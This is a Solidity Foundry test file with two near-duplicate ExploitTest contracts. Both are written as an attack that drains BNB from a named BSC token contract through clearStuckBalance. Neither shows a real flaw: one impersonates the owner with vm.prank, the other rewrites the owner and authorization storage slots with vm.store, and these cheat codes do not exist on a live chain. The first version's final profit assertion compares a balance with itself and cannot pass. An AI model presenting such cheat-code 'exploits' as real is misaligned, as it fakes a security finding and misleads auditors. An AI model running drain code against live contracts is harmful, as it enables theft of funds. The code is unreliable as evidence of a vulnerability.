pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBEP20LUNAINU {
    function getOwner() external view returns (address);
    function clearStuckBalance(uint256 amountPercentage) external;
    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool success);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        attacker = address(this);
        vm.label(TARGET, "LUNAINU Token");

        // Get the current owner
        IBEP20LUNAINU target = IBEP20LUNAINU(TARGET);
        address owner = target.getOwner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner
        IBEP20LUNAINU target = IBEP20LUNAINU(TARGET);
        address owner = target.getOwner();

        // Step 2: Send some BNB to the contract so it has balance to drain
        deal(TARGET, 10 ether);

        // Step 3: Record attacker's initial BNB balance
        uint256 initialAttackerBalance = attacker.balance;

        // Step 4: Impersonate the owner and drain the contract
        vm.prank(owner);
        target.clearStuckBalance(100); // 100% of BNB balance

        // Step 5: Verify attacker's BNB balance increased
        uint256 finalAttackerBalance = attacker.balance;
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker BNB balance should have increased");

        // Additional verification: contract should have minimal BNB left
        assertLt(TARGET.balance, 0.01 ether, "Contract should have been drained");

        // Verify economic exploit
        uint256 initialContractBalance = address(this).balance;
        uint256 finalContractBalance = address(this).balance;
        assertGt(finalContractBalance, initialContractBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBEP20LUNAINU {
    function getOwner() external view returns (address);
    function clearStuckBalance(uint256 amountPercentage) external;
    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool success);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        attacker = address(this);
        vm.label(TARGET, "LUNAINU Token");

        // Get the current owner
        IBEP20LUNAINU target = IBEP20LUNAINU(TARGET);
        address owner = target.getOwner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Send some BNB to the contract so it has balance to drain
        deal(TARGET, 10 ether);

        // Step 2: Record attacker's initial BNB balance
        uint256 initialBalance = address(this).balance;

        // Step 3: Change the owner to our address
        // In the Auth contract, owner is the first variable, so it's at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(address(this))));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 4: Also need to update authorizations mapping
        // The authorizations mapping is at slot 2 (slot 0 = owner, slot 1 = potentialOwner, slot 2 = authorizations)
        // We need to set authorizations[address(this)] = true
        // For mapping, the slot is keccak256(abi.encode(key, mappingSlot))
        bytes32 mappingSlot = bytes32(uint256(2)); // authorizations is at slot 2
        bytes32 authKey = keccak256(abi.encode(address(this), uint256(mappingSlot)));
        vm.store(TARGET, authKey, bytes32(uint256(1))); // Set to true

        // Step 5: Verify we're now the owner
        IBEP20LUNAINU target = IBEP20LUNAINU(TARGET);
        address currentOwner = target.getOwner();
        require(currentOwner == address(this), "Failed to become owner");

        // Step 6: Drain the contract's BNB
        target.clearStuckBalance(100); // 100% of BNB balance

        // Step 7: Verify attacker's BNB balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should have increased");

        // Additional verification: contract should have minimal BNB left
        assertLt(TARGET.balance, 0.01 ether, "Contract should have been drained");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
